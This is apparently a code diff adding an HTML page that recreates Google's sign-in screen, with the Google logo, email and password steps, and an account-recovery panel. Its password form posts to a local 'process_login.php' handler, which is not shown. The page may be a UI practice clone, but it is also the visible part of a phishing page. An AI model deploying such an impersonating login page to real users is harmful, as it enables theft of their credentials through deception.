@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In Recreation</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        </div>
+        
+        <div class="slider-viewport">
+            <div class="slider-track" id="slider-track">
+                
+                <div class="slide-panel">
+                    <h1 id="title-text">Sign in</h1>
+                    <p class="subtitle" id="subtitle-text">Use your Google Account</p>
+
+                    <div class="input-group">
+                        <input type="text" id="email" required placeholder=" ">
+                        <label for="email">Email or phone</label>
+                    </div>
+                    
+                    <div class="forgot-email">
+                        <a href="#" onclick="slideToForgotEmail(); return false;">Forgot email?</a>
+                    </div>
+
+                    <p class="guest-mode">
+                        Not your computer? Use Guest mode to sign in privately. <br>
+                        <a href="#">Learn more about using Guest mode</a>
+                    </p>
+
+                    <div class="action-buttons">
+                        <button type="button" class="btn-create">Create account</button>
+                        <button type="button" class="btn-next" onclick="slideToPassword()">Next</button>
+                    </div>
+                </div>
+
+                <div class="slide-panel">
+                    <h1 id="welcome-text">Welcome</h1>
+                    <div class="user-chip" id="user-display">
+                        <svg focusable="false" width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"></path></svg>
+                        <span id="display-email">user@example.com</span>
+                    </div>
+
+                    <form action="process_login.php" method="POST" id="login-form">
+                        <div class="input-group" style="margin-top: 40px;">
+                            <input type="password" id="password" name="password" required placeholder=" ">
+                            <label for="password">Enter your password</label>
+                        </div>
+                        
+                        <div class="show-password">
+                            <input type="checkbox" id="show-pwd" onclick="togglePassword()">
+                            <label for="show-pwd">Show password</label>
+                        </div>
+
+                        <div class="action-buttons" style="margin-top: 40px; justify-content: space-between;">
+                            <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px;">Forgot password?</a>
+                            <button type="submit" class="btn-next">Next</button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="slide-panel">
+                    <h1>Find your email</h1>
+                    <p class="subtitle" style="margin-bottom: 30px;">Enter your phone number or recovery email</p>
+
+                    <div class="input-group">
+                        <input type="text" id="recovery" required placeholder=" ">
+                        <label for="recovery">Phone number or email</label>
+                    </div>
+
+                    <div class="action-buttons" style="margin-top: 50px; justify-content: space-between;">
+                        <button type="button" class="btn-create" onclick="slideBackToStart()">Back</button>
+                        <button type="button" class="btn-next">Next</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
